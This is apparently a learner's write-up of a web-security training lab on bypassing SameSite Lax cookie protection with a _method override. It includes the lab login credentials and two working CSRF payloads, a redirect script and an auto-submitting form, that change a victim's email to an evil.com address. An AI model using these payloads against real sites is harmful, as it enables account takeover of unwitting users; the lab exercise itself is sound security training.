# Practitioner Lab 83: SameSite Lax bypass via method override

---

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials:Â `wiener:peter`

I went and looked at the email change request and then I started to play around with the request. I tried a normal request and it did not work obviously, I then tried to add the _method but this also did not work 

Lastly I used this payload

```
<script>  
  document.location = "https://0abc006504a427978087081b009d0074.web-security-academy.net/my-account/change-email?email=newEmail@newme&_method=POST";
</script>

```

this allowed me to add a Post request at the end this lying to the server and bypassing the default samesite LAX cookie.

![Untitled](Practitioner%20Lab%2083%20SameSite%20Lax%20bypass%20via%20method%20d19887a8bca84c20b4b2c4d229893340/Untitled.png)

Another way I could of done it was by using the same csrf payload ive done before but make the main request a GET and then change it to a post using the _method to a POST.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9a00cd037eb89c80d92be7004600ce.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="evilpayload&#64;evil&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```